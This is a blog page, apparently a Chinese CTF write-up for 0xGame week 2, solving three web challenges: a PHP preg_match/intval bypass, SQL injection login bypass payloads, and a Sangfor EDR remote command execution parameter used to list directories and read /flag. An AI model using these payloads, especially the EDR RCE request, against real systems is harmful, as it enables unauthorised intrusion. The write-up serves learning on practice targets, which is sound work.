@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32px.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16px.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"casio-3.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0xGame 第二周-WebWriteUp by Casio1. intval 1st 数组绕过没成功 查询相关绕过，了解到preg_match缺陷  而在非多行模式下，$似乎会忽略在句尾的%0a  故传入?0xGame&#x3D;20201001%0a  测试一下： 1http:&#x2F;&#x2F;web.game.0xctf.com:30102&#x2F;?0xGame&#x3D;20201001%">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xGame Week2">
+<meta property="og:url" content="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E4%BA%8C%E5%91%A8-Web/index.html">
+<meta property="og:site_name" content="Where is your love?">
+<meta property="og:description" content="0xGame 第二周-WebWriteUp by Casio1. intval 1st 数组绕过没成功 查询相关绕过，了解到preg_match缺陷  而在非多行模式下，$似乎会忽略在句尾的%0a  故传入?0xGame&#x3D;20201001%0a  测试一下： 1http:&#x2F;&#x2F;web.game.0xctf.com:30102&#x2F;?0xGame&#x3D;20201001%">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/eijfKzEcqD8JCWl.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/QFRXP3vyaoeEANI.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/2tDXQ4A3IBeNbiF.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/CI65vTiGLKED49x.png">
+<meta property="article:published_time" content="2020-10-27T16:00:02.000Z">
+<meta property="article:modified_time" content="2021-03-17T12:26:38.744Z">
+<meta property="article:author" content="Casio3">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/03/17/eijfKzEcqD8JCWl.png">
+
+<link rel="canonical" href="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E4%BA%8C%E5%91%A8-Web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>0xGame Week2 | Where is your love?</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"><a target="_blank" rel="noopener" href="https://github.com/Casio-3/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Where is your love?</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E4%BA%8C%E5%91%A8-Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Casio3">
+      <meta itemprop="description" content="Little trix">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Where is your love?">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          0xGame Week2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-28 00:00:02" itemprop="dateCreated datePublished" datetime="2020-10-28T00:00:02+08:00">2020-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-17 20:26:38" itemprop="dateModified" datetime="2021-03-17T20:26:38+08:00">2021-03-17</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0xGame-第二周-Web"><a href="#0xGame-第二周-Web" class="headerlink" title="0xGame 第二周-Web"></a>0xGame 第二周-Web</h1><h2 id="WriteUp-by-Casio"><a href="#WriteUp-by-Casio" class="headerlink" title="WriteUp by Casio"></a>WriteUp by Casio</h2><h3 id="1-intval"><a href="#1-intval" class="headerlink" title="1. intval"></a>1. <strong>intval</strong></h3><ul>
+<li><p><strong>1st</strong></p>
+<p><del>数组绕过没成功</del></p>
+<p>查询相关绕过，了解到<em>preg_match</em>缺陷</p>
+<blockquote>
+<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
+</blockquote>
+<p>故传入<code>?0xGame=20201001%0a</code> </p>
+<p>测试一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.game.0xctf.com:30102&#x2F;?0xGame&#x3D;20201001%0a&amp;id&#x3D;1024</span><br></pre></td></tr></table></figure>
+
+<p>得到Good job!信号( •̀ ω •́ )y<a id="more"></a></p>
+</li>
+<li><p><strong>2nd</strong></p>
+<p>学习<em>intval</em>函数相关，由题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id=intval($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;id&#x27;</span>] != <span class="number">1024</span> &amp;&amp; $id === <span class="number">1024</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Congratulations!&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.$flag; </span><br></pre></td></tr></table></figure>
+
+<p>使得<code>$_GET[&#39;id&#39;]</code>在类型转换后与1024不等，<code>$id</code>为1024整数</p>
+<p>解题过程中发现不需要进制上的转换，直接1024.123跟个小数就可</p>
+</li>
+<li><p>==&gt;&gt;<font color="red"><strong><em>0xGame{947eae96fe415cbc6eab173adee5d14f}</em></strong></font></p>
+</li>
+<li><p>附图：<img src="https://i.loli.net/2021/03/17/eijfKzEcqD8JCWl.png" alt="image-20201019173025990"></p>
+</li>
+</ul>
+<h3 id="2-just-login"><a href="#2-just-login" class="headerlink" title="2. just_login"></a>2. <strong>just_login</strong></h3><p>   开始不太清楚，搜了万能密码就POST上去了。</p>
+<p>   Hackbar看了看是post请求，然后编辑并重发：</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&amp;password&#x3D;1&#39;or&#39;1&#39;or&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>   查看响应：</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Login Success!Here is your flag:0xGame&#123;e5sy_sql_1njeCtion&#125;</span><br></pre></td></tr></table></figure>
+
+<p>   ==&gt;&gt;<font color="red"><strong><em>0xGame{e5sy_sql_1njeCtion}</em></strong></font></p>
+<p>   后面尝试发现有admin账户可以用，懂了让我干啥，</p>
+<p>   直接登录界面用户名填<code>admin&#39;and 1=1 #</code>，</p>
+<p>   使得sql构造出类似:(密码随意)</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username&#x3D;&#39;admin&#39;and 1&#x3D;1 #&#39; and password&#x3D;&#39;123456&#39; </span><br></pre></td></tr></table></figure>
+<p>   该语句等价为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username&#x3D;&#39;admin&#39;and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>   附图：<img src="https://i.loli.net/2021/03/17/QFRXP3vyaoeEANI.png" alt="image-20201019173252475"></p>
+<h3 id="3-edr"><a href="#3-edr" class="headerlink" title="3. edr"></a>3. edr</h3><p>   由题下载index.php.bak并查看，</p>
+   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 编解码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $data 编解码数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string 返回编解码数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $code = <span class="function"><span class="keyword">function</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); ++$i) &#123;</span><br><span class="line">            $data[$i] = $data[$i] ^ <span class="string">&#x27;G&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;!--此处对传入参数按位异或<span class="string">&#x27;G&#x27;</span>加密 --&gt;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加密请求</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $site  站点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $query 请求串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string 返回请求URL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $request = <span class="function"><span class="keyword">function</span>(<span class="params">$site, $query</span>) <span class="title">use</span>(<span class="params">&amp;$code</span>) </span>&#123;</span><br><span class="line">        $path = base64_encode($code($query));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">$site</span>/<span class="subst">$path</span>&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;!--搜索：php匿名函数中<span class="keyword">use</span>从父作用域继承变量;&amp;$为引用--&gt;</span><br><span class="line">&lt;!--按我的理解是调用上面的加密办法，query实现站点路径--&gt;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解密回复</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $data 回复数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array 返回回复数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    $response = <span class="function"><span class="keyword">function</span>(<span class="params">$data</span>) <span class="title">use</span>(<span class="params">&amp;$code</span>) </span>&#123;</span><br><span class="line">        $ret = json_decode($data, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_null($ret)) &#123;</span><br><span class="line">            $dec = $code(base64_decode($data));</span><br><span class="line">            $ret = json_decode($dec, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
+<p>   搜索发现题指<em>深信服EDR</em>，学习网络资源执行system命令查看目录</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?strip_slashes&#x3D;system&amp;host&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<p>   <img src="https://i.loli.net/2021/03/17/2tDXQ4A3IBeNbiF.png" alt="image-20201019211254070"></p>
+<p>   <strong><em>RCE</em></strong>成功，推测flag放在根目录下</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?strip_slashes&#x3D;system&amp;host&#x3D;ls &#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>   获得如下：</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>   所以用cat命令直接去读取flag</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>   ==&gt;&gt;<font color="red"><strong><em>0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</em></strong></font></p>
+<p>   附图：<img src="https://i.loli.net/2021/03/17/CI65vTiGLKED49x.png" alt="image-20201019211557390"></p>
+<p>//<font color="blue">这样看来。。。读到的bak文件没有发挥太大作用，直接在网上找到深信服edr漏洞相关文章，然后知道是考RCE， 再了解几个文件管理的linux命令，之前又做到了flag放在根目录下的题，如此一试就出来了(●ˇ∀ˇ●)</font></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/28/0xGame%20%E7%AC%AC%E4%B8%80%E5%91%A8-Web/" rel="prev" title="0xGame Week1">
+      <i class="fa fa-chevron-left"></i> 0xGame Week1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/28/0xGame%20%E7%AC%AC%E4%B8%89%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/" rel="next" title="0xGame Week3">
+      0xGame Week3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0xGame-%E7%AC%AC%E4%BA%8C%E5%91%A8-Web"><span class="nav-number">1.</span> <span class="nav-text">0xGame 第二周-Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WriteUp-by-Casio"><span class="nav-number">1.1.</span> <span class="nav-text">WriteUp by Casio</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-intval"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. intval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-just-login"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. just_login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-edr"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. edr</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Casio3</p>
+  <div class="site-description" itemprop="description">Little trix</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Casio3</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js"></script>
+    <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/canvas_sphere.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
